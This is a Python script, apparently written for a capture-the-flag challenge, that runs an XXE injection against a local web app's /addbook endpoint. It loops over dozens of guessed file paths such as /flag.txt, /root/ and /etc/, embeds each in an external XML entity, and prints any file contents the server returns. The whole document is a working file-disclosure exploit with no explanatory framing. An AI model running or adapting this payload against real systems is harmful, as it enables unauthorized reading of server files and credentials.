import requests, itertools
from urllib.parse import quote

base = 'http://localhost:5000/addbook'

dirs = [
    '/', '/root/', '/app/', '/usr/src/app/', '/opt/', '/opt/app/',
    '/var/www/', '/var/www/html/', '/home/', '/home/ctf/', '/home/user/',
    '/srv/', '/usr/local/', '/usr/local/share/', '/etc/', '/run/', '/tmp/',
    '/proc/self/cwd/'
]

names = ['flag', 'flag.txt', 'FLAG', 'FLAG.txt', 'root.txt', 'proof.txt', '.flag', 'secret', 'secret.txt', 'key', 'key.txt']

# de-duplicate paths
paths = []
for d,n in itertools.product(dirs, names):
    p = d + n
    if p not in paths:
        paths.append(p)

# Some extra specific guesses
paths = [
    '/flag', '/flag.txt', '/etc/flag', '/etc/flag.txt', '/root/flag', '/root/flag.txt',
] + paths

headers = {}

session = requests.Session()

def try_path(path):
    xml = f'<?xml version="1.0"?> <!DOCTYPE x [ <!ENTITY xxe SYSTEM "file://{path}"> ]> <Book><Title>&xxe;</Title></Book>'
    resp = session.post(base, data={'xml': xml}, timeout=10)
    text = resp.text
    if 'XML Result' not in text:
        return False, path, 'no_result'
    # extract title content
    start = text.find('<Title>')
    end = text.find('</Title>')
    if start != -1 and end != -1:
        content = text[start+7:end]
        if content.strip():
            return True, path, content.strip()
    # also check for self-closing Title
    if '<Title/>' in text:
        return False, path, ''
    return False, path, ''

hits = []
for i, p in enumerate(paths):
    ok, path, content = try_path(p)
    if ok:
        hits.append((path, content))
        print('HIT', path, '->', content[:120].replace('\n','\\n'))
        break
    # optionally print progress every 20
    if i % 20 == 0:
        print('Tried', i, 'paths...', p)

if not hits:
    print('No hits found among candidates. Last tried:', paths[-1])
